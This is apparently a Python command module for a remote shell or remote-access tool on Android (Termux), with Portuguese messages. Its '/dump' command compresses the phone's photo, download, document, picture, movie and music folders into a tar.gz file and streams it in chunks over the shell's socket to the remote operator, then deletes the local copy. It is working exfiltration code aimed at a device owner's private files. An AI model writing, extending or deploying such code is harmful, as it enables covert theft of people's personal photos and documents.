import os
import subprocess
import time

NAME = "/dump"
DESC = "compacta e envia storage: /dump [dcim|downloads|documents|all]"


def _dirs():
    base = "/dump"
    return {
        "dcim": f"{base}/DCIM",
        "downloads": f"{base}/Download",
        "documents": f"{base}/Documents",
        "pictures": f"{base}/Pictures",
        "movies": f"{base}/Movies",
        "music": f"{base}/Music",
    }


def run(shell, args):
    alvo = args.strip().lower() or "dcim"
    dirs = _dirs()

    if alvo == "all":
        origens = [p for p in dirs.values() if os.path.isdir(p)]
    elif alvo in dirs:
        origens = [dirs[alvo]]
    else:
        shell.socket.send(
            b"uso: /dump [dcim|downloads|documents|pictures|movies|music|all]\n"
        )
        return

    if not origens:
        shell.socket.send(f"erro: nada em /sdcard para '{alvo}'\n".encode())
        return

    nome = f"dump_{alvo}_{int(time.time())}.tar.gz"
    path = f"/data/data/com.termux/files/usr/tmp/{nome}"

    try:
        if os.path.exists(path):
            os.remove(path)

        shell.socket.send(
            f"compactando {len(origens)} pasta(s)...\n".encode()
        )

        cmd = subprocess.run(
            ["tar", "-czf", path, *origens],
            capture_output=True,
            text=True,
            timeout=300,
            stdin=subprocess.DEVNULL,
        )

        if cmd.returncode != 0 or not os.path.exists(path):
            msg = cmd.stderr or cmd.stdout or f"exit {cmd.returncode}"
            shell.socket.send(f"erro: {msg}\n".encode())
            return

        size = os.path.getsize(path)
        if size == 0:
            shell.socket.send(b"erro: arquivo vazio\n")
            return

        shell.socket.sendall(f"FILE {nome} {size}\n".encode())

        enviado = 0
        with open(path, "rb") as f:
            while enviado < size:
                chunk = f.read(65536)
                if not chunk:
                    break
                shell.socket.sendall(chunk)
                enviado += len(chunk)

        shell.socket.sendall(b"\n")
        shell.socket.send(f"enviado: {nome} ({size} bytes)\n".encode())
        os.remove(path)

    except FileNotFoundError:
        shell.socket.send(b"erro: tar nao instalado\n")
    except subprocess.TimeoutExpired:
        shell.socket.send(b"erro: timeout (pasta muito grande?)\n")
    except Exception as e:
        shell.socket.send(f"erro: {e}\n".encode())
